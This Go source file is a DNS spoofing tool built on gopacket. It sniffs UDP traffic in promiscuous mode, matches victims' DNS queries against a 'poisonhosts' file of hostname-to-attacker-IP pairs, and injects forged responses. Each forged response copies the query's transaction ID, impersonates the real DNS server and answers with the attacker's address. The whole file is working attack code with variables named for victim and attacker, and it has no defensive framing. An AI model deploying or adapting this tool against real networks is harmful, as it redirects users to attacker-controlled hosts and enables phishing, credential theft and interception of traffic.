package main

import (
    "fmt"
    "os"
    "strings"
    "strconv"
    "time"
    "log"
    "net"
    "io/ioutil"
    "github.com/google/gopacket"
    "github.com/google/gopacket/pcap"
    "github.com/google/gopacket/layers"
)

var (
	eth layers.Ethernet
	ip4 layers.IPv4
	ip6 layers.IPv6
	tcp layers.TCP
	udp layers.UDP
	dns layers.DNS
	payload gopacket.Payload
	snapshot_len int32  = 1024
	promiscuous  bool   = true
	timeout      time.Duration = 1 * time.Second
	intface    string
	err        error
	handle     *pcap.Handle
	SrcIP      string
	DstIP      string
	SrcPort    string
	DstPort    string
	DnsServerPort string
	VicPort string
	DnsServerIP string
	VicIP string
)


func stringInSlice(a string, list []string) bool {
    for _, b := range list {
        if b == a {
            return true
        }
    }
    return false
}


func captureLiveTraffic(interfaceName string, bpfFilter string, attacker map[string]string){
	
	devices, err := pcap.FindAllDevs()
	if err != nil {
		log.Fatal(err)
	}

	intface = devices[0].Name

	// Open device
	handle, err = pcap.OpenLive(intface, snapshot_len, promiscuous, timeout)
	if err != nil {
		log.Fatal(err)
	}
	defer handle.Close()

	//Setting BPF Filter
	if bpfFilter != "nil" {
		err = handle.SetBPFFilter(bpfFilter)
		if err != nil {
			fmt.Printf("---- Please enter BPF filter in accurate BPF syntax ----\n")
			log.Fatal(err)
		}
	}

	parser := gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet, &eth, &ip4, &ip6, &tcp, &udp, &dns, &payload)

	decodedLayers := make([]gopacket.LayerType, 0, 10)

	for {
		data, _, err := handle.ReadPacketData()
		if err != nil {
			continue
		}

		err = parser.DecodeLayers(data, &decodedLayers)
		hostnames := make([]string, 0, len(attacker))
	    for hostname, _ := range attacker {
	        hostnames = append(hostnames, hostname)
	    }

		for _, typ := range decodedLayers {
			switch typ {
				case layers.LayerTypeUDP:
					VicPort = udp.SrcPort.String()
					DnsServerPort = udp.DstPort.String()
				case layers.LayerTypeIPv4:
					VicIP = ip4.SrcIP.String()
					DnsServerIP = ip4.DstIP.String()
				case layers.LayerTypeDNS:
					dnsId := int(dns.ID)
					
					for _, dnsQuestion := range dns.Questions {
						domain := string(dnsQuestion.Name)
						if(stringInSlice(domain, hostnames)){
							sendDnsPacket(dnsId, VicIP, VicPort, DnsServerIP, domain, attacker[domain])
						}
					}
				}
			}
		}
}

func sendDnsPacket(dnsId int, vicIp string, vicPort string, orgDnsServerIp string, domain_name string, attacker_ip string){	
	
	eth := layers.Ethernet{
		SrcMAC:       net.HardwareAddr{0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
		DstMAC:       net.HardwareAddr{0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
		EthernetType: layers.EthernetTypeIPv4,
	}

	sourceIP := net.ParseIP(orgDnsServerIp)
	destinationIP := net.ParseIP(vicIp)

	ip := layers.IPv4{
		Version:  4,
		TTL:      64,
		SrcIP:    sourceIP,
		DstIP:    destinationIP,
		Protocol: layers.IPProtocolUDP,
	}

	// Create udp layer
	destinationPort, err := strconv.Atoi(vicPort)

	udp := layers.UDP{
		SrcPort: 53,
		DstPort: layers.UDPPort(destinationPort),
	}

	udp.SetNetworkLayerForChecksum(&ip)
	qnName := []byte(domain_name)
	qst := layers.DNSQuestion{
		Name:  qnName,
		Type:  layers.DNSTypeCNAME,
		Class: layers.DNSClassIN,
	}
	transactionId := (uint16(dnsId))
	
	fmt.Println(fmt.Sprintf("Attacker's ip being inserted: %s", attacker_ip))
	attackerIp := net.ParseIP(attacker_ip)

	ans := layers.DNSResourceRecord{
		Name:  qnName,
		Type:  layers.DNSTypeA,
		IP:    attackerIp,
		Class: layers.DNSClassIN,
	}

	dns := layers.DNS{
		BaseLayer:    layers.BaseLayer{},
		ID:           transactionId,
		QR:           true,
		OpCode:       0,
		AA:           false,
		TC:           false,
		RD:           true,
		RA:           true,
		Z:            0,
		ResponseCode: 0,
		QDCount:      1,
		ANCount:      1,
		NSCount:      0,
		ARCount:      0,
		Questions:    []layers.DNSQuestion{qst},
		Answers:      []layers.DNSResourceRecord{ans},
	}

	buffer := gopacket.NewSerializeBuffer()
	options := gopacket.SerializeOptions{
		ComputeChecksums: true,
		FixLengths:       true,
	}

	if err = gopacket.SerializeLayers(buffer, options,
		&eth,
		&ip,
		&udp,
		&dns,
	); err != nil {
		panic(err)
	}
	outgoingPacket := buffer.Bytes()
	if err = handle.WritePacketData(outgoingPacket); err != nil {
		panic(err)
	}
}


func main(){
	commandLineArgs := os.Args
	if len(commandLineArgs) == 0 {
		fmt.Println("Usage:\nsudo go run [-i interface] [-r pcap] [-f filename]")
		fmt.Println("-i flag expects interface name")
		fmt.Println("-r flag expects pcap name")
		fmt.Println("-f flag expects filename")
	} else {
		data, err := ioutil.ReadFile("poisonhosts")
  		if err != nil {
    		fmt.Println("File reading error", err)
    		return
  		}
  		lines := strings.Split(string(data), "\n")
  		
  		attacker := make(map[string]string)
  		for index, element := range lines {
    		_ = index
    		hostname_and_attackerip := strings.Fields(element)
    		if len(hostname_and_attackerip) == 0{
    			break
    		}
    		attacker_ip := hostname_and_attackerip[0]
    		hostname := hostname_and_attackerip[1]
    		attacker[hostname] = attacker_ip
    	}
		
		interfaceName := "any"
		bpfFilter := "udp"
		fmt.Println(attacker)
		captureLiveTraffic(interfaceName, bpfFilter, attacker)
	}
}